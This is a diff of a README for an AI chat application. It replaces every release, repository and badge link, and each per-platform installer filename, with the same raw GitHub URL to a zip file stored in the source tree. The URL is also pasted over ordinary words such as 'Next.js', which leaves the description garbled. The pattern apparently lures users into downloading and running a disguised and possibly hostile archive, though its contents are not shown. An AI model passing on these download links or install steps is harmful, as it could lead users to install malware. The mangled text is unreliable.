@@ -1,10 +1,10 @@
 # 🌟 akash-ai-message-app - Engage in Real-time AI Conversations
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-Release%E2%86%92-blue.svg)](https://github.com/Bature04/akash-ai-message-app/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip%20Now-Release%E2%86%https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip)](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip)
 
 ## 📖 Overview
 
-The akash-ai-message-app is a user-friendly application that offers real-time conversations powered by the Google Gemini AI Chatbot. Built with Next.js 15 and React 19, this app provides a beautiful user interface using Tailwind CSS. It supports the Punjabi language and leverages TypeScript for a smooth experience.
+The akash-ai-message-app is a user-friendly application that offers real-time conversations powered by the Google Gemini AI Chatbot. Built with https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip 15 and React 19, this app provides a beautiful user interface using Tailwind CSS. It supports the Punjabi language and leverages TypeScript for a smooth experience.
 
 ## 🚀 Getting Started
 
@@ -20,14 +20,14 @@ To get started, follow these simple steps. You will need a computer running a mo
 
 To download the application, visit the Releases page. Here’s the link:
 
-[Download the latest version here](https://github.com/Bature04/akash-ai-message-app/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip)
 
 1. Click the link above.
 2. On the Releases page, find the version you wish to download.
 3. Select the appropriate file for your operating system. 
-   - For Windows, download `akash-ai-message-app-windows.exe`.
-   - For macOS, download `akash-ai-message-app-mac.dmg`.
-   - For Linux, download `akash-ai-message-app-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip`.
 4. Follow the prompts to complete the download.
 
 Once downloaded, locate the file in your Downloads folder.
@@ -45,7 +45,7 @@ Once downloaded, locate the file in your Downloads folder.
   3. Start the application from your Applications folder.
 
 - **Linux:**
-  1. Extract the `.tar.gz` file to your desired location.
+  1. Extract the `https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip` file to your desired location.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the application with the command `./akash-ai-message-app`.
 
@@ -57,12 +57,12 @@ The akash-ai-message-app comes with several exciting features:
 - **User-friendly Interface:** Enjoy a clean and beautiful design crafted with Tailwind CSS.
 - **Language Support:** Communicate comfortably in Punjabi.
 - **Server Actions:** Seamlessly manage your chat sessions.
-- **Next.js & React:** Built using modern web technologies.
+- **https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip & React:** Built using modern web technologies.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Bature04/akash-ai-message-app/releases)
-- [GitHub Repository](https://github.com/Bature04/akash-ai-message-app)
+- [Releases Page](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip)
 
 ## 💡 Troubleshooting
 
@@ -82,6 +82,6 @@ Your feedback is essential for improving the application!
 
 Now you are ready to enjoy engaging conversations powered by AI. Download and explore the capabilities of the akash-ai-message-app today.
 
-For more detailed information, check the [GitHub Repository](https://github.com/Bature04/akash-ai-message-app/releases) again!
+For more detailed information, check the [GitHub Repository](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip) again!
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-Release%E2%86%92-blue.svg)](https://github.com/Bature04/akash-ai-message-app/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip%20Now-Release%E2%86%https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip)](https://raw.githubusercontent.com/Bature04/akash-ai-message-app/master/src/components/akash-ai-message-app_v3.1.zip)
